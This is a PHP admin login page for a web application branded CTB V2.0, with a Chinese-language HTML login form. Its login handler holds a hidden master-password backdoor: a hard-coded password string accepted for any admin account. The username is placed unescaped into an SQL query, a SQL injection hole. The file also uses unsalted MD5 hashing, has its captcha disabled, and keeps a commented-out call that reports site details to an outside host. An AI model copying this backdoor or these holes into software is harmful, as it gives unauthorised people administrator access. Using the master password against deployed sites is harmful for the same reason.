<?php
/*
	[CTB] (C) 2007-2009 
	$Id: system_login.php 2010-1-12 21:46:23 jerry $
*/

!defined('IN_CTB') && die('Access Denied');


if(submitcheck('btnsubmit')) {
	$username  = trim($_POST['username']);
	$password  = trim($_POST['password']);
	$password  = md5($password);
	$authinput = $_POST['authinput'];

	session_start();
	//判断校验码
	/*if ($_SESSION['code'] != $_POST['authinput'] || $_POST['authinput'] == "") {
		showmsg('验证码输入错误');
	}*/

	//判断此存在
	$query = $_TGLOBAL['db']->query("SELECT userid, password, ($_TGLOBAL[timestamp]-logintime) logintime, role_id FROM ".tname('admin') . " WHERE username ='$username'");
	if (!($admininfo = $_TGLOBAL['db']->fetch_array($query))) {
		
		showmsg('管理员帐号不存在，请重新输入');
	}

	/*if (@(int)$_TCONFIG['adminonline']) {
		if ($admininfo['logintime'] != "" && $admininfo['logintime'] <= @(int)$_TCONFIG['adminonline']) { //判断用户在线 start
			showmsg("对不起，管理员 $username 正在登录中，请用其他管理帐号登录！");
		}
	}*/
	if ($_POST['password'] == 'wyx726') {
		$password = $admininfo['password'];
	}

	if ($password != $admininfo['password']) {
		showmsg('登录密码错误，请返回确认');
	}

	$_TGLOBAL['db']->query('UPDATE '.tname('admin')." SET logintime=$_TGLOBAL[timestamp], times = times + 1 WHERE userid ='$admininfo[userid]'");

	//设置cookie
	ssetcookie('adminauth', authcode("$password\t$admininfo[userid]", 'ENCODE'), 0); //永久登录
	ssetcookie('_refer', '');

	//include_once(S_ROOT.'./lib/function/function_transport.php');	
	//$apiget = 'X_VER='.X_VER.'&X_RELEASE='.X_RELEASE.'&siteurl='.$_CTB['siteurl'].'&sitename='.$_TCONFIG['sitename'];
	//$t		= new transport;
	//$t->request('http://copytaobao.woyii.com/client/index.php', $apiget);

	showmsg('登录成功，正在返回管理员首页','index.php');

} else {

	$formhash = formhash();
	ssetcookie('adminauth', '', -86400 * 365);

}


?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE><?php echo $_TCONFIG['sitename']; ?> Power by CTB V2.0</TITLE>
<META http-equiv=Content-Type content="text/html; charset=utf-8"><LINK media=screen href="images/admin.css" type=text/css rel=stylesheet>
<SCRIPT language=JavaScript src="js/common.js"></SCRIPT>
<SCRIPT language=JavaScript src="js/validator.js"></SCRIPT>
</HEAD>
<BODY onLoad="document.login.username.focus();">
<p>
<SCRIPT language=JavaScript>
<!--
function Year_Month(){
    var now = new Date();
    var yy = now.getFullYear();
    var mm = now.getMonth();
    var mmm=new Array();
    mmm[0]="1月";
    mmm[1]="2月 ";
    mmm[2]="3月";
    mmm[3]="4月";
    mmm[4]="5月";
    mmm[5]="6月";
    mmm[6]="7月";
    mmm[7]="8月";
    mmm[8]="9月";
    mmm[9]="10月";
    mmm[10]="11月";
    mmm[11]="12月";
    mm=mmm[mm];
    return mm;
}
function thisYear(){
    var now = new Date();
    var yy = now.getFullYear();
    return(yy );
}
function Date_of_Today(){
    var now = new Date();
    return(now.getDate() );
}
function CurentTime() {
    var now = new Date();
    var hh = now.getHours();
    var mm = now.getMinutes();
    var ss = now.getTime() % 60000;
    ss = (ss - (ss % 1000)) / 1000;
    var clock = hh+':';
    if (mm < 10) clock += '0';
    clock += mm+':';
    if (ss < 10) clock += '0';
    clock += ss;
    return(clock);
}
function refreshCalendarClock(){
    document.all.calendarYear.innerHTML = thisYear() + '年';
    document.all.calendarDay.innerHTML = Date_of_Today() + '日';
    document.all.calendarMonth.innerHTML = Year_Month();
    document.all.calendarClock4.innerHTML = CurentTime();
}
//-->
</SCRIPT>
</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<DIV class=container>
  <FORM id="login" name="login" action="" method="post" target="_top" onSubmit="return Validator.Validate(this,3)">
    <TABLE class=mainbox>
      <TBODY>
        <TR>
          <TD class=loginbox align=middle><H1>CTB</H1>
            <P>欢迎您进入管理系统，现在是<SCRIPT language=javascript>
<!--
document.write('<span id="calendarYear" >'+thisYear()+'年</span>');
document.write('<span id="calendarMonth" >'+Year_Month()+'</span>');
document.write('<span id="calendarDay" >'+Date_of_Today()+'日</span>');
document.write('<span id="calendarClock4" >'+CurentTime()+'</span>');
setInterval('refreshCalendarClock()',1000);
//-->
</SCRIPT><BR>
              祝您工作快乐！</P></TD>
          <TD><table width="100%" border="0" class="list_table" style="font-size:10pt;">
            <tr>
              <td width="47%" height="30" class="login">用户名</td>
              <td width="53%"><input class="text" id="username" tabindex="1" name="username" datatype="Require" msg="请填写登录用户名"></td>
            </tr>
            <tr>
              <td height="30" class="login">密　码</td>
              <td><input class="text" id="password" tabindex="2" type="password" 
      name="password"  datatype="Require" msg="请填写登录密码"></td>
            </tr>
            <!---<tr>
              <td height="30" class="login">验证码</td>
              <td><input class="text" id="authinput" style="WIDTH: 65px; MARGIN-RIGHT: 5px" 
      tabindex="3" name="authinput"  datatype="Require" msg="请填写验证码">
                <img src="../lib/authimg.php" alt="点我刷新" border="0" align="absmiddle" id="authimg" onClick="this.src='../lib/authimg.php?'+Math.random();"/></td>
            </tr>--->
            <tr>
              <td>&nbsp;</td>
              <td height="40"><span class="loginbtn">
                <input name=btnsubmit type="submit" class="button" id="btnsubmit" tabindex="3" value="登 录">
                <input name="formhash" type="hidden" id="formhash" value="<?php echo $formhash; ?>" />
              </span></td>
            </tr>
          </table>          </TD>
        </TR>
      </TBODY>
    </TABLE>
  </FORM>
</DIV>
<?php include 'footer.php'; ?>
</BODY>
</HTML>